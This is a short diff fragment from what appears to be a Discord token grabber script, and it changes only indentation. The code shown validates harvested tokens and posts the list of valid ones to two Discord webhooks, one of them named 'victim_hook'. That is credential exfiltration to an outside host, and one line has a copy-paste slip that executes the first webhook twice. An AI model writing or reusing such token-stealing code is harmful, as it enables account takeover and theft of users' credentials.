@@ -46,10 +46,10 @@ if __name__ == "__main__":
                 if len(token) > 15 and token not in checked and variant1(token) == True:
                     print(f'Token: {token} is Valid')
                     checked.append(token)
-                     webhook = DiscordWebhook(url=hook, content=checked)
-                     response = webhook.execute()
-                     webhook2 = DiscordWebhook(url=victim_hook, content=checked)
-                     response2 = webhook.execute()
+                    webhook = DiscordWebhook(url=hook, content=checked)
+                    response = webhook.execute()
+                    webhook2 = DiscordWebhook(url=victim_hook, content=checked)
+                    response2 = webhook.execute()
                 else:
                     print(f'Token: {token} is Invalid')
         if len(checked) > 0:
